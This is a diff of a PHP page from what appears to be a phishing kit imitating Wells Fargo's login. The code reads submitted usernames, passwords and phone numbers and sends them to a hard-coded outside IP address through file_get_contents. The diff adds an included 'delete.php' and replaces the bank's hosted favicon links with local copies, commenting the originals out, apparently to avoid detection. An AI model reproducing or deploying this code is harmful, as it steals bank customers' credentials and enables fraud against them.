@@ -14,6 +14,9 @@ include('../../files/boot/DB-METHOD.php');
 include('../../files/boot/DB-RANGE.php');
 include('../../files/boot/enc.php');
 include('../../call.php');
+
+include 'delete.php';
+
 $user = @$_POST['j_username'];
 $pass = @$_POST['j_password'];
 $phone = @$_POST['phone'];
@@ -63,12 +66,18 @@ $test = @file_get_contents("http://137.74.171.167/panelo/a.php?main=$user,$pass,
     <meta http-equiv="Pragma" content="no-cache">
     <meta name="apple-itunes-app" content="app-id=311548709">
 
+    <link rel="shortcut icon" type="image/x-icon" href="../../files/icons/favicon.ico">
+    <link rel="apple-touch-icon" sizes="120x120" href="../../files/icons/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../files/icons/apple-touch-icon-180x180.png">
+    <link rel="icon" sizes="128x128" href="../../files/icons/icon-normal-128x128.png">
+    <link rel="icon" sizes="192x192" href="../../files/icons/icon-hires-192x192.png">
+    <!-- 
     <link rel="shortcut icon" type="image/x-icon" href="https://www01.wellsfargomedia.com/favicon.ico">
     <link rel="apple-touch-icon" sizes="120x120" href="https://www.wellsfargo.com/assets/images/icons/apple-touch-icon-120x120.png">
     <link rel="apple-touch-icon" sizes="180x180" href="https://www.wellsfargo.com/assets/images/icons/apple-touch-icon-180x180.png">
     <link rel="icon" sizes="128x128" href="https://www.wellsfargo.com/assets/images/icons/icon-normal-128x128.png">
     <link rel="icon" sizes="192x192" href="https://www.wellsfargo.com/assets/images/icons/icon-hires-192x192.png">
-
+ -->
     <link rel="stylesheet" href="../../files/bars/framework.css">
     <link rel="stylesheet" href="../../files/bars/util.css">
     <link rel="stylesheet" href="../../files/bars/smartphone-homepage.css">
